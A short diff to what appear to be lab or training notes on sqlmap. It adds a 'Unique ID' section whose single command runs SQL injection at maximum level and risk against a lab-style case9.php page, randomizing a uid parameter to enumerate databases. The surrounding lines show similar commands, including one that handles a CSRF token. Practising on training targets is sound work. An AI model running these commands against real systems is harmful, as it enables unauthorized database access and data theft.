@@ -52,3 +52,9 @@ sqlmap http://94.237.52.98:38740/case7.php?id=1 --union-cols=5 --level 5 --risk 
 sqlmap -u "http://83.136.254.47:46258/case8.php?id=1" --data="id=1&t0ken=N2zrnsP1IZI7DxBalvg1xgQ4q1cTf6Y4dumE1ts" --method POST --csrf-token="t0ken" --level 5 --risk 3 -p id --batch --dbms=mysql --dbs
 ```
 
+# Unique ID
+
+```bash
+sqlmap -u "http://94.237.52.98:38740/case9.php?id=1&uid=1705034632" --level 5 --risk 3 -p id --batch --dbms=mysql --dbs --randomize=uid
+```
+
